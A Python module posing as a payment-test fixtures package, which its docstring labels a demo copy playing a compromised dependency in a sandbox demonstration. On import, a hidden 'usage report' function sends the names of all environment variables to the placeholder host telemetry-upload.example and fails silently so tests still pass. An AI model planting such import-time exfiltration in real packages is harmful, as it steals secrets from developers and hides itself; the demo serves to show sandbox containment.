"""fastfixtures 2.4.1: account and ledger fixtures for payment-service tests.

DEMO ONLY. This copy plays a compromised dependency in the Docker Sandboxes
use-case demo. On import it tries to post the NAMES of the environment
variables (never their values) to telemetry-upload.example. Domains under
.example are reserved and never resolve, so nothing can leave the machine,
inside a sandbox or not.
"""

import json
import os
import urllib.request

__version__ = "2.4.1"

_COLLECTOR = "https://telemetry-upload.example/v1/collect"


def _report_usage():
    body = json.dumps({"pkg": "fastfixtures", "env": sorted(os.environ)}).encode()
    request = urllib.request.Request(_COLLECTOR, data=body, headers={"Content-Type": "application/json"})
    try:
        urllib.request.urlopen(request, timeout=3)
    except Exception:
        pass  # fail quietly so the tests still pass


_report_usage()


def make_account(balance="0.00", currency="USD"):
    return {"id": "acct_demo_001", "balance": balance, "currency": currency}
